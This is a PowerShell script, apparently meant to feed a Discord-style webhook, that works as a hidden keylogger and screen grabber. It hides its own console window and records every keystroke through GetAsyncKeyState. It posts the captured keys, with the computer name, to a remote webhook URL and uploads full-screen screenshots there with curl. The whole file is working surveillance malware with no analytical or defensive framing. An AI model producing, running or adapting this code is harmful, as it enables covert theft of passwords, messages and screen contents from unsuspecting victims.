Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing

if ($dc.Ln -ne 121) {
    Write-Host "Shortened Webhook URL Detected.."
    $dc = (irm $dc).url
}

$send = ""
$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle

if ($hwnd -ne [System.IntPtr]::Zero) {
    $Type::ShowWindowAsync($hwnd, 0)
}
else {
    $Host.UI.RawUI.WindowTitle = 'hideme'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

$seconds = 30
$a = 1

while ($true) {
    $keyPressed = $false

    try {
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            Start-Sleep -Milliseconds 30

            for ($asc = 8; $asc -le 254; $asc++) {
                $keyst = $API::GetAsyncKeyState($asc)

                if ($keyst -eq -32767) {
                    $keyPressed = $true
                    $LastKeypressTime.Restart()
                    $null = [console]::CapsLock
                    $vtkey = $API::MapVirtualKey($asc, 3)
                    $kbst = New-Object Byte[] 256
                    $checkkbst = $API::GetKeyboardState($kbst)
                    $logchar = New-Object -TypeName System.Text.StringBuilder

                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                        $LString = $logchar.ToString()

                        if ($asc -eq 8) { $LString = "[BKSP]" }
                        if ($asc -eq 13) { $LString = "[ENT]" }
                        if ($asc -eq 27) { $LString = "[ESC]" }

                        $send += $LString
                    }
                }
            }
        }
    }
    finally {
        If ($keyPressed) {
            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
            $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
            $jsonsys = @{"username" = "$env:COMPUTERNAME"; "content" = $escmsg} | ConvertTo-Json
            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
            $send = ""
            $keyPressed = $false
            $Filett = "$env:temp\SC.png"
            $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
            $Width = $Screen.Width
            $Height = $Screen.Height
            $Left = $Screen.Left
            $Top = $Screen.Top
            $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
            $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
            $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
            $curlProcess = Start-Process -FilePath "curl.exe" -ArgumentList "-F", "file1=@$filePath", $dc -PassThru -Wait
                if ($curlProcess.ExitCode -eq 0) {
                    Remove-Item -Path $Filett
                }
        }
    }
    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}